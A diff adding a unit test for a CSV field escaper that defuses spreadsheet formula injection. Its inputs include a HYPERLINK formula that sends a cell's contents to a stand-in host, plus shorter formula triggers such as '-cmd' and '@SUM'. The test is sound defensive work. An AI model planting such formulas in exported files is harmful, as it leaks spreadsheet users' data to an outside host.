@@ -60,6 +60,19 @@ describe("csvField", () => {
     expect(csvField(0)).toBe("0");
   });
 
+  it("defuses text a spreadsheet would run as a formula and keeps numbers raw", () => {
+    expect(csvField('=HYPERLINK("https://x/?"&A1,"x")')).toBe(
+      `"'=HYPERLINK(""https://x/?""&A1,""x"")"`,
+    );
+    expect(csvField("+1")).toBe("'+1");
+    expect(csvField("-cmd")).toBe("'-cmd");
+    expect(csvField("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(csvField("\tx")).toBe("'\tx");
+    expect(csvField("\rx")).toBe(`"'\rx"`);
+    expect(csvField("a=b")).toBe("a=b");
+    expect(csvField(-2.5)).toBe("-2.5");
+  });
+
   it("joins rows with CRLF and ends with one", () => {
     expect(toCsv(["a", "b"], [[1, null]])).toBe("a,b\r\n1,\r\n");
   });
